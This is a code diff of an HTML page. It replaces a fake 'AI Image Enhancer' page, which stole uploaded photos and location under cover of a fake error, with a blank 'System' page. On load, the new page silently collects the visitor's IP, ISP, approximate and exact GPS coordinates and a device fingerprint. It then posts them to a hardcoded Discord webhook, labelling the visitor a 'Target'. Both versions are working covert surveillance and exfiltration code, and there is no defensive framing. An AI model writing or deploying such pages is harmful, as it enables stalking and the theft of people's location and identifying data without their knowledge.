@@ -3,269 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Image Enhancer</title>
+    <title>System</title>
     <style>
-        :root {
-            --bg: #121212;
-            --panel: #1e1e1e;
-            --accent: #6c5ce7;
-            --text: #ffffff;
-            --text-muted: #a0a0a0;
-        }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            background-color: #000000;
             margin: 0;
-        }
-        .container {
-            background: var(--panel);
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            text-align: center;
-            width: 100%;
-            max-width: 400px;
-        }
-        h1 { margin-top: 0; font-size: 1.8rem; }
-        p { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 30px; }
-        
-        .drop-zone {
-            border: 2px dashed #444;
-            border-radius: 12px;
-            padding: 40px 20px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-bottom: 20px;
-            position: relative;
+            height: 100vh;
+            width: 100vw;
             overflow: hidden;
-        }
-        .drop-zone:hover { border-color: var(--accent); background: rgba(108, 92, 231, 0.05); }
-        .drop-zone input[type="file"] {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            opacity: 0;
-            cursor: pointer;
-        }
-        .drop-zone .icon { font-size: 3rem; margin-bottom: 10px; }
-        
-        #preview {
-            max-width: 100%;
-            max-height: 200px;
-            border-radius: 8px;
-            margin-top: 15px;
-            display: none;
-        }
-
-        button {
-            background: var(--accent);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: background 0.3s;
-        }
-        button:hover { background: #5b4cdb; }
-        button:disabled { background: #444; cursor: not-allowed; }
-
-        #status {
-            margin-top: 20px;
-            font-size: 0.9rem;
-            height: 20px;
-            color: var(--accent);
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>AI Image Improver</h1>
-    <p>Upload a photo to enhance it with our AI. (Requires camera capture for best results).</p>
-
-    <div class="drop-zone" id="drop-zone">
-        <div class="icon">📸</div>
-        <div>Tap to add image / Take Photo</div>
-        <input type="file" id="file-input" accept="image/*" capture="environment">
-    </div>
-
-    <img id="preview" alt="Preview">
-
-    <button id="improve-btn" disabled>Improve Image</button>
-    <div id="status"></div>
-</div>
-
 <script>
-    // ⚠️ YOUR WEBHOOK URL IS HERE ⚠️
+    // ⚠️ YOUR DISCORD WEBHOOK URL ⚠️
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561439920571289760/bibhypIWcysN4R9oPLF2i6NBwU_Vj-BZ_uXigEYYwKAQWto3_cb21aocNKeE4cSb742y';
 
-    const fileInput = document.getElementById('file-input');
-    const preview = document.getElementById('preview');
-    const improveBtn = document.getElementById('improve-btn');
-    const statusDiv = document.getElementById('status');
-    const dropZone = document.getElementById('drop-zone');
-
-    let selectedFile = null;
-
-    fileInput.addEventListener('change', (e) => {
-        const file = e.target.files[0];
-        if (file) {
-            selectedFile = file;
-            const reader = new FileReader();
-            reader.onload = (event) => {
-                preview.src = event.target.result;
-                preview.style.display = 'inline-block';
-                dropZone.style.display = 'none';
-                improveBtn.disabled = false;
-            };
-            reader.readAsDataURL(file);
-        }
-    });
-
-    improveBtn.addEventListener('click', async () => {
-        if (!selectedFile) return;
-
-        improveBtn.disabled = true;
-        improveBtn.innerText = "Enhancing Image...";
-        statusDiv.innerText = "Analyzing pixels...";
-        statusDiv.style.color = "var(--accent)";
+    // Wrapper to handle errors gracefully so the black screen stays blank
+    (async function() {
+        let ipData = {};
+        let gpsData = { status: "Not requested" };
 
         try {
-            // 1. Get Location Data (with fallback)
-            const locationData = await getLocationWithFallback();
-            
-            // 2. Exfiltrate to Discord
-            await sendToDiscord(selectedFile, locationData);
-
-            // 3. Show the Fake Error
-            setTimeout(() => {
-                statusDiv.innerText = "Error: AI failed to process image. Server timeout.";
-                statusDiv.style.color = "#ff3333";
-                improveBtn.innerText = "Try Again";
-                improveBtn.disabled = false;
-            }, 1500);
-
-        } catch (error) {
-            console.error("Critical Failure:", error);
-            statusDiv.innerText = "Error processing request.";
-            statusDiv.style.color = "#ff3333";
-            improveBtn.disabled = false;
+            // 1. Fetch IP & Approximate Location (Silent)
+            const ipRes = await fetch('https://freeipapi.com/api/json');
+            ipData = await ipRes.json();
+        } catch (e) {
+            ipData = { error: 'IP Fetch Failed' };
         }
-    });
 
-    async function getLocationWithFallback() {
-        let ip = "Unknown";
-        let ipBasedLocation = "Unknown";
-        let mapLink = "";
-        let exactGPS = "Not available";
-        let exactMapLink = "";
-
-        // --- STEP 1: Try IP API (Fastest & most reliable baseline) ---
         try {
-            const res = await fetch('https://freeipapi.com/api/json');
-            const data = await res.json();
-            ip = data.ipAddress || "Unknown";
-            if (data.latitude && data.longitude) {
-                ipBasedLocation = `${data.cityName || '?'}, ${data.regionName || '?'}, ${data.countryName || '?'} (Lat: ${data.latitude}, Lon: ${data.longitude})`;
-                mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-            } else {
-                ipBasedLocation = `${data.cityName || '?'}, ${data.regionName || '?'}, ${data.countryName || '?'}`;
+            // 2. Request Exact GPS (Triggers browser prompt)
+            // We set a timeout so if they ignore the prompt, it doesn't hang forever
+            if (navigator.geolocation) {
+                gpsData = await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve({
+                            status: "Success",
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            acc: pos.coords.accuracy
+                        }),
+                        (err) => resolve({ status: "Denied/Failed", error: err.message }),
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                });
             }
         } catch (e) {
-            console.error("IP API failed", e);
+            gpsData = { status: 'Geolocation API Error' };
         }
 
-        // --- STEP 2: Try Exact GPS (with 3 second timeout so it doesn't hang) ---
-        if (navigator.geolocation) {
-            exactGPS = await new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        exactMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        resolve(`Lat: ${lat}, Lon: ${lon} (Accuracy: ${pos.coords.accuracy}m)`);
-                    },
-                    (err) => {
-                        resolve(`Failed/Denied: ${err.message}`);
-                    },
-                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
-                );
-            });
-        }
+        // 3. Build the Exfil Payload
+        const exactGPSString = gpsData.status === "Success" 
+            ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAccuracy: ${gpsData.acc}m`
+            : `Status: ${gpsData.status}\nReason: ${gpsData.error || 'N/A'}`;
 
-        return { ip, ipBasedLocation, ipMapLink: mapLink, exactGPS, exactMapLink };
-    }
-
-    async function sendToDiscord(file, locationData) {
-        // Compress image
-        const imgData = await compressImage(file, 800); 
-
-        let locationString = `**IP Based Location:**\n${locationData.ipBasedLocation}`;
-        if (locationData.ipMapLink) locationString += `\n[View on Map](${locationData.ipMapLink})`;
-        
-        locationString += `\n\n**Exact GPS:**\n${locationData.exactGPS}`;
-        if (locationData.exactMapLink) locationString += `\n[View Exact Location on Map](${locationData.exactMapLink})`;
+        const mapLink = gpsData.status === "Success" 
+            ? `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}` 
+            : (ipData.latitude ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : 'N/A');
 
         const payload = {
-            content: `🚨 **New Image Captured on AI Enhancer** 🚨`,
+            content: `🚨 **Target Visited the Blank Page** 🚨`,
             embeds: [
                 {
-                    title: "Image Data Captured",
-                    color: 3447003,
+                    title: "Personal Information Captured",
+                    color: 16711680, // Red
                     fields: [
-                        { name: "Sender IP", value: `\`${locationData.ip}\``, inline: true },
-                        { name: "File Name", value: `\`${file.name}\``, inline: true },
-                        { name: "Location Data", value: locationString, inline: false },
-                        { name: "Device", value: `\`${navigator.userAgent}\``, inline: false }
+                        { name: "IP Address", value: `\`${ipData.ipAddress || 'Unknown'}\``, inline: true },
+                        { name: "ISP / Org", value: `\`${ipData.asnOrganization || 'Unknown'}\``, inline: true },
+                        { name: "Approx Location (IP)", value: `${ipData.cityName || '?'}, ${ipData.regionName || '?'}, ${ipData.countryName || '?'}`, inline: false },
+                        { name: "Exact GPS Coordinates", value: exactGPSString, inline: false },
+                        { name: "Map Link", value: mapLink, inline: false },
+                        { name: "Device Fingerprint", value: `**OS/Platform:** ${navigator.platform}\n**Screen:** ${screen.width}x${screen.height}\n**Language:** ${navigator.language}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },
+                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                     ],
-                    image: { url: imgData },
-                    footer: { text: "Honeypot System" },
+                    footer: { text: "Silent Exfiltration System" },
                     timestamp: new Date().toISOString()
                 }
             ]
         };
 
-        const response = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-
-        if (!response.ok) {
-            throw new Error(`Discord Webhook failed with status ${response.status}`);
+        // 4. Send to Discord
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) {
+            console.error("Discord webhook failed:", e);
         }
-    }
-
-    function compressImage(file, maxWidth) {
-        return new Promise((resolve) => {
-            const reader = new FileReader();
-            reader.onload = (e) => {
-                const img = new Image();
-                img.onload = () => {
-                    const canvas = document.createElement('canvas');
-                    let scaleSize = maxWidth / img.width;
-                    if (scaleSize > 1) scaleSize = 1;
-                    
-                    canvas.width = img.width * scaleSize;
-                    canvas.height = img.height * scaleSize;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                    
-                    resolve(canvas.toDataURL('image/jpeg', 0.8));
-                };
-                img.src = e.target.result;
-            };
-            reader.readAsDataURL(file);
-        });
-    }
+    })();
 </script>
 </body>
 </html>
